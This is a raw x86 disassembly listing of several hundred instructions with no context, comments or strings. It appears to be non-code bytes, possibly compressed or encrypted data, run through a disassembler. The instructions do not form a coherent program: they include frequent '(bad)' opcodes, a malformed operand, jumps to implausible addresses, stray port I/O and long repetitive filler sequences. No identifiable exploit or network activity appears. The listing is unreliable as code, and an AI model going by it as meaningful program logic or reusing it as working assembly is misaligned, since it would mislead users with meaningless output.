  418861:	enter  0x6ae0,0x72
  418865:	cld    
  418866:	jecxz  0x4188d5
  418868:	xor    ch,BYTE PTR [ebx+0x476c6506]
  41886e:	(bad)  [eax+0x67]
  418871:	daa    
  418872:	jmp    0xe278ee76
  418877:	jae    0x4188db
  418879:	add    BYTE PTR [ecx],bh
  41887b:	loope  0x4188e8
  41887d:	xor    DWORD PTR [eax+0x21766ae2],ecx
  418883:	jecxz  0x4188e7
  418885:	add    BYTE PTR [esi],dh
  418887:	in     al,0x73
  418889:	push   0x64ffe339
  41888e:	test   ecx,esp
  418890:	pop    esp
  418891:	outs   dx,BYTE PTR ds:[esi]
  418892:	jge    0x41887d
  418894:	imul   eax,DWORD PTR [eax],0x6b
  418897:	out    0x6a,eax
  418899:	outs   dx,DWORD PTR ds:[esi]
  41889a:	jp     0x418889
  41889c:	jmp    DWORD PTR [ebp+0x7d]
  41889f:	out    0x66,eax
  4188a1:	outs   dx,DWORD PTR ds:[esi]
  4188a2:	outs   dx,BYTE PTR ds:[esi]
  4188a3:	or     al,0x0
  4188a5:	jae    0x4188a0
  4188a7:	loopne 0x418911
  4188a9:	jns    0x4188c3
  4188ab:	loope  0x418909
  4188ad:	js     0x41886e
  4188af:	call   0xe049f51f
  4188b4:	pop    esp
  4188b5:	jae    0x41886e
  4188b7:	jecxz  0x4188b8
  4188b9:	imul   eax,DWORD PTR [edi-0x46ff9222],0xbb7731f4
  4188c3:	call   0xe819fafb
  4188c8:	pop    esp
  4188c9:	bound  esp,QWORD PTR [ecx+0x6]
  4188cc:	jb     0x418933
  4188ce:	ins    BYTE PTR es:[edi],dx
  4188cf:	mov    ah,0x2f
  4188d1:	xor    ecx,eax
  4188d3:	out    0x6b,eax
  4188d5:	popa   
  4188d6:	xor    DWORD PTR [esi],edi
  4188d8:	sub    BYTE PTR [edi+0x31],bl
  4188db:	push   eax
  4188dc:	xor    ah,BYTE PTR [edi+0x0]
  4188df:	dec    edi
  4188e0:	aas    
  4188e1:	pop    ds
  4188e2:	add    BYTE PTR [eax-0xd],al
  4188e5:	push   ds
  4188e6:	jb     0x41890d
  4188e8:	mov    al,ds:0xec0c6822
  4188ed:	xor    BYTE PTR [ebx+0x10],ah
  4188f0:	mov    al,ds:0xd55c32f0
  4188f5:	lock call DWORD PTR [ecx]
  4188f8:	add    bl,BYTE PTR ds:0x1d11563
  4188fe:	push   0x611dae10
  418903:	push   es
  418904:	scas   al,BYTE PTR es:[edi]
  418905:	and    BYTE PTR [eax],al
  418907:	aad    0xfc
  418909:	cmp    esi,DWORD PTR [esp+ecx*8-0x53]
  41890d:	add    DWORD PTR [ecx-0x30],esi
  418910:	leave  
  418911:	and    BYTE PTR [ecx+esi*1+0x11],ah
  418915:	repz xor DWORD PTR [ebx],eax
  418918:	psllw  mm7,mm7
  41891b:	into   
  41891c:	shl    BYTE PTR ds:0x279fce6c,0x5f
  418923:	ret    0x206f
  418926:	jb     0x418959
  418928:	(bad)  
  418929:	and    al,0x6e
  41892b:	cwde   
  41892c:	int    0x25
  41892e:	ins    BYTE PTR es:[edi],dx
  41892f:	xchg   esp,eax
  418930:	mov    dl,0x2a
  418932:	addr16 popf 
  418934:	jle    0x418956
  418936:	outs   dx,BYTE PTR ds:[esi]
  418937:	xor    DWORD PTR [ebx-0x767d8edc],edx
  41893d:	and    BYTE PTR [eax],al
  41893f:	and    BYTE PTR [esi],0x20
  418942:	ins    BYTE PTR es:[edi],dx
  418943:	add    BYTE PTR [ebp+0x63700191],al
  418949:	xchg   ecx,eax
  41894a:	cmp    al,0x63
  41894c:	arpl   WORD PTR [edx+0x9656d29],si
  418952:	dec    ebx
  418953:	and    eax,0x2b56094c
  418958:	pop    edi
  418959:	sub    eax,0x9402d46
  41895e:	cmp    al,0x2f
  418960:	inc    eax
  418961:	sbb    eax,0x9522b4b
  418966:	inc    esi
  418967:	and    esp,DWORD PTR ds:0x13043a2e
  41896d:	xor    bh,BYTE PTR [ebx]
  41896f:	sub    BYTE PTR [edx+ebp*1],dl
  418972:	sbb    ebx,DWORD PTR [edi]
  418974:	and    BYTE PTR [ecx],cl
  418976:	push   es
  418977:	sub    al,0x13
  418979:	sub    eax,0x3031261b
  41897e:	add    eax,0x14340b2c
  418983:	add    al,0x46
  418985:	fstp   TBYTE PTR [ecx-0x4220dc11]
  41898b:	sti    
  41898c:	pop    ds
  41898d:	(bad)  
  41898f:	add    edx,edx
  418991:	sbb    al,0xe2
  418993:	xor    edi,ebx
  418995:	xor    ecx,esi
  418997:	xor    edi,ebx
  418999:	pop    ds
  41899a:	fadd   QWORD PTR [ebx]
  41899c:	fstp   DWORD PTR [ebx+edx*8]
  41899f:	xor    edi,ebx
  4189a1:	not    DWORD PTR ds:0xce006f2
  4189a7:	repz add BYTE PTR [ebx-0x27],ah
  4189ab:	add    al,0xf2
  4189ad:	push   esi
  4189ae:	(bad)  
  4189b0:	repnz addr16 fucom st(0)
  4189b4:	sti    
  4189b5:	inc    esi
  4189b6:	loope  0x41898e
  4189b8:	in     al,0x9e
  4189ba:	cmp    BYTE PTR [ebp-0x77cfabc6],al
  4189c0:	das    
  4189c1:	xchg   edx,eax
  4189c2:	div    DWORD PTR [esi+0x2b]
  4189c5:	or     DWORD PTR [ecx],0x1d652be7
  4189cb:	add    BYTE PTR [ecx-0x18],bh
  4189ce:	hlt    
  4189cf:	sub    al,0x7c
  4189d1:	aas    
  4189d2:	sbb    eax,0x30234863
  4189d7:	popa   
  4189d8:	push   eax
  4189d9:	xlat   BYTE PTR ds:[ebx]
  4189da:	sub    BYTE PTR [ebp+0x44],ch
  4189dd:	iret   
  4189de:	sbb    esi,DWORD PTR [edx-0x2]
  4189e1:	pop    ds
  4189e2:	ficom  WORD PTR [eax+0x1]
  4189e5:	or     BYTE PTR [ebx+ebp*2],dh
  4189e8:	cmovle esp,DWORD PTR [ecx]
  4189eb:	arpl   cx,bp
  4189ed:	pop    edx
  4189ee:	sbb    eax,0xf49b3974
  4189f3:	sub    al,0xd
  4189f5:	sbb    ebp,DWORD PTR ss:[ebx+0xe]
  4189f9:	sub    al,0x1b
  4189fb:	pop    edi
  4189fc:	cvtps2pd xmm3,QWORD PTR ds:0x3651bf63
  418a03:	imul   edx,edi,0x50
  418a06:	sbb    ebp,DWORD PTR ds:0x432ffe2a
  418a0c:	mov    esp,0x5a4af400
  418a11:	mov    edi,0xe963213f
  418a16:	or     bl,BYTE PTR ds:0xf448d974
  418a1c:	sub    al,0xde
  418a1e:	adc    eax,0xc62e1e
  418a23:	sbb    al,0x70
  418a25:	(bad)  
  418a26:	cmovs  esp,DWORD PTR [edi-0x46]
  418a2a:	push   ebx
  418a2b:	sbb    eax,0xf753bf67
  418a30:	pusha  
  418a31:	mov    esi,0x9b61f757
  418a36:	or     eax,0x2fc357db
  418a3b:	cmp    DWORD PTR [edx-0x39],edi
  418a3e:	daa    
  418a3f:	and    DWORD PTR [ebx-0x17],esp
  418a42:	xor    bh,BYTE PTR [esi]
  418a44:	push   ebx
  418a45:	add    cl,al
  418a47:	cmp    dl,BYTE PTR [ebx+0x44]
  418a4a:	xchg   esi,eax
  418a4b:	push   ebx
  418a4c:	dec    esp
  418a4d:	inc    ebp
  418a4e:	test   al,0x43
  418a50:	push   ecx
  418a51:	dec    ecx
  418a52:	mov    eax,0x21464451
  418a57:	dec    ecx
  418a58:	inc    ecx
  418a59:	xor    BYTE PTR [ecx+0x40],dh
  418a5c:	inc    ebp
  418a5d:	inc    ebx
  418a5e:	or     dl,BYTE PTR [eax+edx*2+0x54]
  418a62:	adc    eax,0x15593051
  418a67:	in     al,0x2c
  418a69:	cs test al,0xa
  418a6c:	add    BYTE PTR [eax],al
  418a6e:	cwde   
  418a6f:	or     al,BYTE PTR [edx]
  418a71:	add    BYTE PTR [eax],al
  418a73:	cmp    eax,0x8955444a
  418a78:	or     eax,0xa980000
  418a7d:	add    BYTE PTR [eax],al
  418a7f:	cwde   
  418a80:	or     cl,BYTE PTR [edi+0x4f]
  418a83:	push   esi
  418a84:	inc    ecx
  418a85:	push   ebx
  418a86:	inc    ecx
  418a87:	sbb    dl,BYTE PTR [eax+0x5c]
  418a8a:	dec    ebp
  418a8b:	inc    ecx
  418a8c:	out    dx,al
  418a8d:	jno    0x418afe
  418a8f:	imul   ebp,ebx,0x65
  418a92:	je     0x418ac0
  418a94:	inc    edx
  418a95:	outs   dx,BYTE PTR gs:[esi]
  418a97:	fs jmp 0x418b0c
  418a9a:	jae    0x418a28
  418a9c:	dec    edi
  418a9d:	jno    0x418b11
  418a9f:	push   0xfffffff1
  418aa1:	ins    DWORD PTR es:[edi],dx
  418aa2:	je     0x418a2a
  418aa4:	icebp  
  418aa5:	jno    0x418b1a
  418aa7:	popa   
  418aa8:	jmp    0x418b17
  418aaa:	pop    esp
  418aab:	(bad)
  418aae:	outs   dx,BYTE PTR ds:[esi]
  418aaf:	jmp    0x418a8e
  418ab1:	pop    esp
  418ab2:	ins    BYTE PTR es:[edi],dx
  418ab3:	fmul   QWORD PTR [ecx]
  418ab5:	push   ecx
  418ab6:	outs   dx,BYTE PTR ds:[esi]
  418ab7:	shl    edi,0x6e
  418aba:	je     0x418a75
  418abc:	add    eax,0x8431536c
  418ac1:	xor    esp,DWORD PTR [edi-0x71]
  418ac4:	pop    DWORD PTR [ecx]
  418ac6:	inc    esp
  418ac7:	mov    BYTE PTR [ebx],ah
  418ac9:	xor    DWORD PTR [eax+edx*2-0x77],ebp
  418acd:	aas    
  418ace:	pop    edi
  418acf:	push   esp
  418ad0:	xchg   ebp,eax
  418ad1:	add    DWORD PTR [ecx+esi*1-0x50],ebx
  418ad5:	add    DWORD PTR [eax],eax
  418ad7:	add    BYTE PTR [ecx],dh
  418ad9:	mov    al,0x1
  418adb:	add    BYTE PTR [ecx],dh
  418add:	push   ss
  418ade:	daa    
  418adf:	js     0x418b2d
  418ae1:	mov    al,0x56
  418ae3:	ins    DWORD PTR es:[edi],dx
  418ae4:	push   edi
  418ae5:	cmp    al,0x39
  418ae7:	pop    edi
  418ae8:	inc    ebx
  418ae9:	push   ebp
  418aea:	push   eax
  418aeb:	push   ebp
  418aec:	sbb    BYTE PTR [esi+0x56],dl
  418aef:	aas    
  418af0:	add    esi,DWORD PTR [eax-0x19eb8fde]
  418af6:	add    edi,edi
  418af8:	xchg   esi,eax
  418af9:	scas   eax,DWORD PTR es:[edi]
  418afa:	sub    DWORD PTR [ecx+0x14],0x15632202
  418b01:	ret    
  418b02:	repz sub eax,0x1da415
  418b08:	fiadd  WORD PTR [ebx]
  418b0a:	push   ebp
  418b0b:	inc    ebp
  418b0c:	aam    0x9b
  418b0e:	inc    esp
  418b0f:	popa   
  418b10:	fisttp QWORD PTR [eax]
  418b12:	cmp    ah,BYTE PTR [ebx-0xe]
  418b15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b16:	pop    ds
  418b17:	jno    0x418adf
  418b19:	mov    ebx,0xc2d45128
  418b1e:	ss addr16 (bad) 
  418b21:	int    0x3c
  418b23:	xor    DWORD PTR fs:[eax+0x33],esp
  418b27:	ins    DWORD PTR es:[edi],dx
  418b28:	rcl    ah,cl
  418b2a:	ss jno 0x418ba5
  418b2d:	into   
  418b2e:	push   ebp
  418b2f:	ins    DWORD PTR es:[edi],dx
  418b30:	adc    ch,0x36
  418b33:	jno    0x418abd
  418b35:	arpl   WORD PTR [edi],bx
  418b37:	inc    edi
  418b38:	lea    ecx,[ecx]
  418b3a:	out    0x3,eax
  418b3c:	add    BYTE PTR [edi-0x7edb6cd2],bl
  418b42:	xor    bl,dl
  418b44:	cmc    
  418b45:	dec    esp
  418b46:	sub    eax,0x53311f7b
  418b4b:	mov    WORD PTR [edi],?
  418b4d:	sbb    DWORD PTR cs:[eax-0x72d49dbb],edx
  418b54:	sub    BYTE PTR [ebx+0x4b],ah
  418b57:	jns    0x418b81
  418b59:	push   edx
  418b5a:	or     DWORD PTR ds:0x5a3e4527,esi
  418b60:	daa    
  418b61:	inc    ebx
  418b62:	dec    esi
  418b63:	inc    ebp
  418b64:	aaa    
  418b65:	dec    edx
  418b66:	or     edi,esp
  418b68:	and    BYTE PTR [ebp+0x2e],al
  418b6b:	cli    
  418b6c:	cmc    
  418b6d:	pop    esp
  418b6e:	sub    eax,0x3831204b
  418b73:	cmp    ebp,DWORD PTR [ecx]
  418b75:	in     al,dx
  418b76:	sbb    BYTE PTR [edx+eiz*1+0x0],al
  418b7a:	sbb    eax,0x2bee3616
  418b7f:	add    al,0x4
  418b81:	xor    DWORD PTR [edx],ebp
  418b83:	or     edi,DWORD PTR [edx]
  418b85:	ficomp WORD PTR [eax]
  418b87:	add    ch,dh
  418b89:	inc    eax
  418b8a:	repz or ah,BYTE PTR [eax]
  418b8d:	fisttp QWORD PTR [eax]
  418b8f:	sub    BYTE PTR [eax],ah
  418b91:	aad    0x33
  418b93:	or     ah,BYTE PTR [ebx]
  418b95:	in     eax,0x2d
  418b97:	sub    BYTE PTR [edx],ah
  418b99:	int    0x51
  418b9b:	aad    0x1a
  418b9d:	lds    esi,FWORD PTR [ecx]
  418b9f:	enter  0x1f,0xce
  418ba3:	push   ds
  418ba4:	int3   
  418ba5:	push   esp
  418ba6:	(bad)  
  418ba7:	sub    al,0xe7
  418ba9:	inc    esp
  418baa:	leave  
  418bab:	sub    eax,0x34851cca
  418bb0:	shl    BYTE PTR [esi],cl
  418bb2:	xchg   edi,eax
  418bb3:	push   esi
  418bb4:	add    ah,cl
  418bb6:	aas    
  418bb7:	daa    
  418bb8:	arpl   WORD PTR [ebx-0x6698cea3],di
  418bbe:	xor    cl,BYTE PTR [ebx+0x72]
  418bc1:	test   BYTE PTR [edi+0x3a],cl
  418bc4:	lea    esi,[bp+si]
  418bc7:	dec    edx
  418bc8:	jb     0x418b4e
  418bca:	dec    esi
  418bcb:	dec    eax
  418bcc:	outs   dx,BYTE PTR ds:[esi]
  418bcd:	jl     0x418c1e
  418bcf:	sub    BYTE PTR [edx-0x78],dh
  418bd2:	push   ds
  418bd3:	sub    BYTE PTR [edi],bh
  418bd5:	jmp    0x85a4a34f
  418bda:	push   0x354c6317
  418bdf:	dec    edx
  418be0:	jb     0x418c42
  418be2:	std    
  418be3:	sbb    al,0x45
  418be5:	dec    esp
  418be6:	stc    
  418be7:	aaa    
  418be8:	jno    0x418c2e
  418bea:	call   DWORD PTR [ecx+0x63]
  418bed:	inc    eax
  418bee:	xor    eax,0x5d40724a
  418bf3:	sbb    eax,0x36653143
  418bf8:	jb     0x418c2f
  418bfa:	push   esp
  418bfb:	sub    BYTE PTR [edi-0x17],dh
  418bfe:	cmc    
  418bff:	push   ss
  418c00:	ja     0x418c1b
  418c02:	dec    ecx
  418c03:	dec    ebp
  418c04:	arpl   WORD PTR [edx],bx
  418c06:	add    BYTE PTR [ecx],bh
  418c08:	pop    ss
  418c09:	ins    DWORD PTR es:[edi],dx
  418c0a:	adc    BYTE PTR [eax+ebp*1],dh
  418c0d:	ja     0x418bf8
  418c0f:	cmc    
  418c10:	push   ss
  418c11:	ja     0x418c0c
  418c13:	push   ds
  418c14:	aaa    
  418c15:	arpl   WORD PTR ds:0x4714416,ax
  418c1b:	in     al,dx
  418c1c:	xor    eax,0x2117dd6e
  418c21:	je     0x418c0c
  418c23:	fsub   QWORD PTR [edi]
  418c25:	jbe    0x418bf3
  418c27:	add    al,0x1d
  418c29:	push   esp
  418c2a:	mov    esi,0x6c27dd
  418c2f:	inc    BYTE PTR [esi]
  418c31:	dec    ebx
  418c32:	jo     0x418c21
  418c34:	call   0xee38fe88
  418c39:	pusha  
  418c3a:	jae    0x418c17
  418c3c:	cmp    ch,BYTE PTR [ebx+0x6b]
  418c3f:	mov    ebp,0xb548ffe8
  418c44:	(bad)  
  418c45:	pusha  
  418c46:	jb     0x418be3
  418c48:	jmp    0xebddedba
  418c4d:	dec    ebx
  418c4e:	outs   dx,DWORD PTR ds:[esi]
  418c4f:	mov    edi,0x976460f1
  418c54:	call   0xdceeffa9
  418c59:	inc    DWORD PTR [esi-0x53]
  418c5c:	ficom  DWORD PTR [ebx+0x6f]
  418c5f:	arpl   ax,si
  418c61:	ins    DWORD PTR es:[edi],dx
  418c62:	dec    ecx
  418c63:	jbe    0x418c50
  418c65:	push   0x72
  418c67:	jne    0x418c55
  418c69:	jae    0x418cd4
  418c6b:	add    bh,dh
  418c6d:	add    al,BYTE PTR [eax]
  418c6f:	inc    ebx
  418c70:	pop    es
  418c71:	add    esi,DWORD PTR [esi+0x65]
  418c74:	push   0xffffffe1
  418c76:	dec    esi
  418c77:	imul   ebp,esp,0x5c536b40
  418c7d:	xlat   BYTE PTR ds:[ebx]
  418c7e:	outs   dx,BYTE PTR fs:[esi]
  418c80:	aas    
  418c81:	ss gs fs pop ecx
  418c85:	or     eax,0x22f6f4c
  418c8a:	outs   dx,BYTE PTR ds:[esi]
  418c8b:	push   ebp
  418c8c:	sbb    esi,eax
  418c8e:	jno    0x418cd1
  418c90:	pop    eax
  418c91:	loop   0x418cfd
  418c93:	outs   dx,DWORD PTR ds:[esi]
  418c94:	inc    ebx
  418c95:	loopne 0x418d06
  418c97:	push   eax
  418c98:	pop    edx
  418c99:	add    eax,0xf1546976
  418c9e:	bound  esp,QWORD PTR [ebp-0x72]
  418ca1:	in     eax,dx
  418ca2:	imul   esi,DWORD PTR [ebp+0x6d],0x4d
  418ca6:	add    BYTE PTR [ecx+0x31],al
  418ca9:	aam    0x17
  418cab:	jae    0x418c6f
  418cad:	mov    ebx,0xd59a6d55
  418cb2:	sbb    edx,DWORD PTR [eax-0x5d]
  418cb5:	mov    ecx,0xd58d6733
  418cba:	arpl   WORD PTR es:[edx-0x7c9efe50],sp
  418cc1:	imul   esi,DWORD PTR [ecx],0xdbbe4274
  418cc7:	arpl   WORD PTR [ebp-0x7cbefe74],cx
  418ccd:	jns    0x418d00
  418ccf:	je     0x418cd1
  418cd1:	test   BYTE PTR [edx+0x31],bh
  418cd4:	jb     0x418d2c
  418cd6:	sbb    al,0x28
  418cd8:	popa   
  418cd9:	gs je  0x418d00
  418cdc:	je     0x418d2e
  418cde:	mov    al,0x42
  418ce0:	arpl   WORD PTR [ebx+0x44],ax
  418ce3:	cmp    eax,0x51524c70
  418ce8:	ja     0x418d2c
  418cea:	inc    esp
  418ceb:	daa    
  418cec:	imul   esp,DWORD PTR [edx+0x3c],0x1d
  418cf0:	jb     0x418d06
  418cf2:	icebp  
  418cf3:	add    eax,DWORD PTR [ecx+0xc]
  418cf6:	fidiv  WORD PTR [edi]
  418cf8:	inc    ebx
  418cf9:	pmulhw mm3,QWORD PTR [esi]
  418cfc:	inc    ecx
  418cfd:	or     al,0xde
  418cff:	aaa    
  418d00:	addr16 pop ss
  418d02:	stc    
  418d03:	and    BYTE PTR [edi-0x3],bl
  418d06:	or     al,0x31
  418d08:	inc    edi
  418d09:	pandn  mm6,QWORD PTR [edi]
  418d0c:	ins    DWORD PTR es:[edi],dx
  418d0d:	add    ecx,DWORD PTR ds:0x9dd44104
  418d13:	xor    eax,0x3112d541
  418d18:	arpl   WORD PTR [edx],ax
  418d1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d1b:	push   ds
  418d1c:	jb     0x418cea
  418d1e:	scas   eax,DWORD PTR es:[edi]
  418d1f:	inc    edx
  418d20:	jb     0x418cea
  418d22:	or     bh,dl
  418d24:	aaa    
  418d25:	push   es
  418d26:	fdivr  DWORD PTR es:[eax]
  418d29:	(bad)  
  418d2a:	push   ss
  418d2b:	int3   
  418d2c:	inc    edx
  418d2d:	rcl    BYTE PTR [esi],cl
  418d2f:	rcr    DWORD PTR [edi+edx*4],cl
  418d32:	xor    cl,dl
  418d34:	and    al,0x0
  418d36:	popf   
  418d37:	es xchg edi,eax
  418d39:	xor    DWORD PTR [esi-0x6dc837e9],edx
  418d3f:	push   esp
  418d40:	les    ebp,FWORD PTR [ecx+esi*1]
  418d43:	or     DWORD PTR [edx+esi*1+0x1f82ef8e],edx
  418d4a:	lea    ecx,[ecx]
  418d4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d4d:	xor    cl,BYTE PTR [esi+0x70378448]
  418d53:	xor    BYTE PTR [ebx+esi*1+0x1d842f54],dl
  418d5a:	cmp    DWORD PTR gs:[eax-0x18b5b6c9],ecx
  418d61:	add    eax,DWORD PTR [ecx+0x1c]
  418d64:	pop    ebx
  418d65:	sbb    eax,0xde4a2643
  418d6a:	push   edx
  418d6b:	sub    eax,0x3c610443
  418d70:	push   ebx
  418d71:	sbb    eax,0x322a2623
  418d76:	adc    ch,BYTE PTR [edx]
  418d78:	xor    esp,DWORD PTR [edi]
  418d7a:	imul   BYTE PTR [esi]
  418d7c:	cmp    bh,BYTE PTR [eax]
  418d7e:	imul   BYTE PTR [esi]
  418d80:	dec    edx
  418d81:	daa    
  418d82:	xor    DWORD PTR [ecx],ecx
  418d84:	out    0x3,eax
  418d86:	xor    DWORD PTR [ecx],ecx
  418d88:	out    0x3,eax
  418d8a:	xor    DWORD PTR [ecx],ecx
  418d8c:	out    0x3,eax
  418d8e:	xor    DWORD PTR [ecx],ecx
  418d90:	out    0x3,eax
  418d92:	xor    DWORD PTR [ecx],ecx
  418d94:	out    0x3,eax
  418d96:	xor    DWORD PTR [ecx],ecx
  418d98:	out    0x3,eax
  418d9a:	add    BYTE PTR [ecx],dh
  418d9c:	or     DWORD PTR [eax],eax
  418d9e:	jmp    0xe94196d5
  418da3:	xor    cl,BYTE PTR [ecx]
  418da5:	add    cl,ch
  418da7:	xor    cl,BYTE PTR [ecx]
  418da9:	add    cl,ch
  418dab:	xor    cl,BYTE PTR [ecx]
  418dad:	add    cl,ch
  418daf:	xor    cl,BYTE PTR [ecx]
  418db1:	add    cl,ch
  418db3:	xor    cl,BYTE PTR [ecx]
  418db5:	add    cl,ch
  418db7:	xor    cl,BYTE PTR [ecx]
  418db9:	add    cl,ch
  418dbb:	xor    cl,BYTE PTR [ecx]
  418dbd:	add    cl,ch
  418dbf:	xor    cl,BYTE PTR [ecx]
  418dc1:	add    cl,ch
  418dc3:	xor    cl,BYTE PTR [ecx]
  418dc5:	add    cl,ch
  418dc7:	xor    cl,BYTE PTR [ecx]
  418dc9:	add    cl,ch
  418dcb:	xor    cl,BYTE PTR [ecx]
  418dcd:	add    cl,ch
  418dcf:	xor    cl,BYTE PTR [ecx]
  418dd1:	add    cl,ch
  418dd3:	xor    cl,BYTE PTR [ecx]
  418dd5:	add    cl,ch
  418dd7:	xor    cl,BYTE PTR [ecx]
  418dd9:	add    cl,ch
  418ddb:	xor    cl,BYTE PTR [ecx]
  418ddd:	add    cl,ch
  418ddf:	xor    cl,BYTE PTR [ecx]
  418de1:	add    cl,ch
  418de3:	xor    cl,BYTE PTR [ecx]
  418de5:	add    cl,ch
  418de7:	xor    cl,BYTE PTR [ecx]
  418de9:	add    cl,ch
  418deb:	xor    cl,BYTE PTR [ecx]
  418ded:	add    cl,ch
  418def:	xor    cl,BYTE PTR [ecx]
  418df1:	add    cl,ch
  418df3:	xor    cl,BYTE PTR [ecx]
  418df5:	add    cl,ch
  418df7:	xor    cl,BYTE PTR [ecx]
  418df9:	add    BYTE PTR [edx],bh
  418dfb:	cmp    eax,0x456c2c
  418e00:	mov    al,ds:0x51452dd9
  418e05:	sub    eax,0x46453a00
  418e0a:	arpl   WORD PTR ds:0xd6c2df7,dx
  418e10:	dec    esi
  418e11:	sbb    edx,DWORD PTR [eax+0x8]
  418e14:	sub    DWORD PTR [ecx],esi
  418e16:	aas    
  418e17:	add    BYTE PTR [eax+0xb],bl
  418e1a:	add    BYTE PTR [eax],al
  418e1c:	dec    eax
  418e1d:	or     eax,DWORD PTR [esi]
  418e1f:	dec    esp
  418e20:	or     DWORD PTR ds:0x5194c17,eax
  418e26:	daa    
  418e27:	dec    esp
  418e28:	cdq    
  418e29:	or     edi,DWORD PTR ds:0x4b0b894c
  418e2f:	dec    esp
  418e30:	mov    DWORD PTR [ebx],ecx
  418e32:	pop    ebx
  418e33:	dec    esp
  418e34:	(bad)  [edx]
  418e36:	imul   ecx,DWORD PTR [ecx+ebx*8+0xa],0xffffff84
  418e3b:	dec    esp
  418e3c:	leave  
  418e3d:	or     dl,BYTE PTR [edi-0x54f536b4]
  418e43:	dec    esp
  418e44:	(bad)  [edx]
  418e46:	enter  0xd94c,0xa
  418e4a:	in     al,dx
  418e4b:	dec    esp
  418e4c:	leave  
  418e4d:	or     al,BYTE PTR ds:0xac94d
  418e53:	add    al,bl
  418e55:	or     bh,ch
  418e57:	(bad)  
  418e58:	fmul   DWORD PTR [edx+0xac80001]
  418e5e:	dec    ecx
  418e5f:	jns    0x418e49
  418e61:	inc    esi
  418e62:	imul   esp,DWORD PTR [ebx+0x0],0x45
  418e66:	jmp    DWORD PTR [eax+0x6e]
  418e69:	fs (bad) 
  418e6b:	inc    DWORD PTR [eax]
  418e6d:	enter  0x800a,0x1a
  418e71:	enter  0xa,0x41
  418e75:	or     ch,dl
  418e77:	inc    ebx
  418e78:	popa   
  418e79:	fs in  al,0xff
  418e7c:	add    BYTE PTR [eax-0x77e37ff6],cl
  418e82:	or     al,BYTE PTR [eax]
  418e84:	dec    esp
  418e85:	dec    edi
  418e86:	out    0x5c,al
  418e88:	ins    BYTE PTR es:[edi],dx
  418e89:	js     0x418ed0
  418e8b:	jo     0x418efd
  418e8d:	push   esp
  418e8e:	in     al,0x73
  418e90:	popa   
  418e91:	xor    DWORD PTR [eax+0x30310004],esi
  418e97:	in     al,0xff
  418e99:	data16 mov al,0x46
  418e9c:	pop    edi
  418e9d:	shl    bh,cl
  418e9f:	push   ds
  418ea0:	add    BYTE PTR [eax],dh
  418ea2:	mov    al,0x1
  418ea4:	adc    BYTE PTR [eax],0xb0
  418ea7:	add    DWORD PTR [eax],eax
  418ea9:	repnz mov dh,0x1a
  418eac:	imul   ecx,eax,0x300036c4
  418eb2:	mov    al,0x1
  418eb4:	adc    BYTE PTR [ebx-0x50],0x1
  418eb8:	add    BYTE PTR [ecx-0x47],bh
  418ebb:	ss je  0x418e4c
  418ebe:	bound  ebp,QWORD PTR [eax+eax*1]
  418ec1:	xor    esi,DWORD PTR [eax-0x4fcb7fff]
  418ec7:	add    DWORD PTR [eax],eax
  418ec9:	add    BYTE PTR [ecx+ebp*2-0x1f],dh
  418ecd:	inc    ebx
  418ece:	mov    ss,WORD PTR [ebx-0x797394d0]
  418ed4:	sub    eax,0x1b23171
  418ed9:	add    BYTE PTR [ecx+0x310001d2],dh
  418edf:	jae    0x418efb
  418ee1:	imul   eax,DWORD PTR [edi+eax*4+0x17],0x20
  418ee6:	jo     0x418f08
  418ee8:	xor    DWORD PTR [eax+edx*2+0x3c],eax
  418eec:	and    eax,DWORD PTR [eax]
  418eee:	xor    BYTE PTR [eax-0x4ff17fff],dh
  418ef4:	add    DWORD PTR [eax],eax
  418ef6:	cld    
  418ef7:	cmp    ah,ah
  418ef9:	dec    edi
  418efa:	sbb    BYTE PTR [ebx+0x30],dl
  418efd:	jae    0x418f22
  418eff:	inc    ebp
  418f00:	xor    eax,0x1b03300
  418f05:	sbb    BYTE PTR [edi-0x50],0x1
  418f09:	add    dl,dh
  418f0b:	or     BYTE PTR [esi],dl
  418f0d:	sbb    DWORD PTR [edx],ecx
  418f0f:	cs or  eax,0xa2df2e4
  418f15:	xor    edx,ebx
  418f17:	and    edi,ebp
  418f19:	das    
  418f1a:	loopne 0x418f24
  418f1c:	jmp    0xcecac024
  418f21:	add    esi,DWORD PTR [ecx]
  418f23:	or     DWORD PTR [edx],ebp
  418f25:	sbb    ebx,edx
  418f27:	sub    edi,esi
  418f29:	sbb    DWORD PTR [ecx],edx
  418f2b:	dec    eax
  418f2c:	retf   
  418f2d:	sbb    BYTE PTR [eax],al
  418f2f:	(bad)  
  418f30:	shl    BYTE PTR cs:[esi],1
  418f33:	mov    ebp,0x962fc81a
  418f38:	adc    eax,esp
  418f3a:	jecxz  0x418ebe
  418f3c:	sub    al,0xd6
  418f3e:	pop    ss
  418f3f:	mov    al,ds:0x3103e809
  418f44:	mov    edi,esi
  418f46:	add    esi,DWORD PTR [ecx]
  418f48:	or     DWORD PTR [eax-0x6acd65e1],ebp
  418f4e:	sbb    al,0x80
  418f50:	adc    eax,0x327d2499
  418f55:	popf   
  418f56:	and    BYTE PTR [ecx],dl
  418f58:	xor    eax,0x18551a7e
  418f5d:	out    0x4,eax
  418f5f:	xor    DWORD PTR [ecx],ecx
  418f61:	add    BYTE PTR [bx+di],dh
  418f64:	or     edi,esp
  418f66:	push   ebx
  418f67:	push   edx
  418f68:	pop    ss
  418f69:	jp     0x418f85
  418f6b:	push   edi
  418f6c:	sub    dl,BYTE PTR [ebx+0x4]
  418f6f:	pusha  
  418f70:	sub    al,0x45
  418f72:	xor    BYTE PTR [edx+ebp*1],bh
  418f75:	pop    ecx
  418f76:	pop    ds
  418f77:	or     eax,0x2325404e
  418f7c:	sub    al,0x3a
  418f7e:	sbb    DWORD PTR [edi],edx
  418f80:	adc    eax,0x2b0e511b
  418f85:	add    BYTE PTR [ebp+0x28],cl
  418f88:	push   ss
  418f89:	jno    0x418f98
  418f8b:	in     al,dx
  418f8c:	pop    ss
  418f8d:	jb     0x418faa
  418f8f:	push   ds
  418f90:	sub    esi,DWORD PTR [edi+esi*1+0x0]
  418f94:	push   ss
  418f95:	pop    ss
  418f96:	jno    0x418f98
  418f98:	dec    eax
  418f99:	sub    ebx,DWORD PTR [esp+0x15]
  418f9d:	sbb    DWORD PTR [esi+edx*1+0x27],ebp
  418fa1:	sub    BYTE PTR [edx+0x1d],dh
  418fa4:	cld    
  418fa5:	xor    BYTE PTR [ebx+0x5],ah
  418fa8:	sub    ecx,ebp
